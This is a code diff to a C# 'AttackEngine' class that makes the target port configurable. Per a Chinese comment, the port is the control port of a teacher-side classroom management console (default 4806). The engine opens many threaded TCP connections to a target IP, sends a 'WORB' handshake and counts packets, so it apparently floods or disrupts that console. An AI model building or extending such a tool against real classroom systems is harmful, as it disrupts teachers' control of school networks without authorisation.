@@ -52,6 +52,9 @@ public class AttackEngine : IDisposable
     public AttackMode Mode { get; private set; }
     public string TargetIP { get; private set; } = "";
 
+    /// <summary>教师端控制端口 (0 = 使用默认 4806, 由设置注入)</summary>
+    public int Port { get; set; }
+
     public void Start(string targetIP, AttackMode mode, int threadCount, int durationSeconds)
     {
         if (_running) return;
@@ -200,7 +203,7 @@ public class AttackEngine : IDisposable
         client.SendTimeout = 3000;
 
         var ip = IPAddress.Parse(TargetIP);
-        client.Connect(new IPEndPoint(ip, PacketBuilder.ControlPort));
+        client.Connect(new IPEndPoint(ip, Port > 0 ? Port : PacketBuilder.ControlPort));
 
         // WORB 握手
         client.GetStream().Write(worb, 0, worb.Length);
@@ -268,7 +271,7 @@ public class AttackEngine : IDisposable
         client.SendTimeout = 3000;
 
         var ip = IPAddress.Parse(TargetIP);
-        client.Connect(new IPEndPoint(ip, PacketBuilder.ControlPort));
+        client.Connect(new IPEndPoint(ip, Port > 0 ? Port : PacketBuilder.ControlPort));
 
         client.GetStream().Write(worb, 0, worb.Length);
         Interlocked.Increment(ref Stats.PacketsSent);
@@ -320,7 +323,7 @@ public class AttackEngine : IDisposable
         client.SendTimeout = 2000;
 
         var ip = IPAddress.Parse(TargetIP);
-        client.Connect(new IPEndPoint(ip, PacketBuilder.ControlPort));
+        client.Connect(new IPEndPoint(ip, Port > 0 ? Port : PacketBuilder.ControlPort));
         client.GetStream().Write(worb, 0, worb.Length);
 
         Interlocked.Increment(ref Stats.PacketsSent);
@@ -343,7 +346,7 @@ public class AttackEngine : IDisposable
         client.SendTimeout = 3000;
 
         var ip = IPAddress.Parse(TargetIP);
-        client.Connect(new IPEndPoint(ip, PacketBuilder.ControlPort));
+        client.Connect(new IPEndPoint(ip, Port > 0 ? Port : PacketBuilder.ControlPort));
         client.GetStream().Write(worb, 0, worb.Length);
 
         ct.WaitHandle.WaitOne(100);
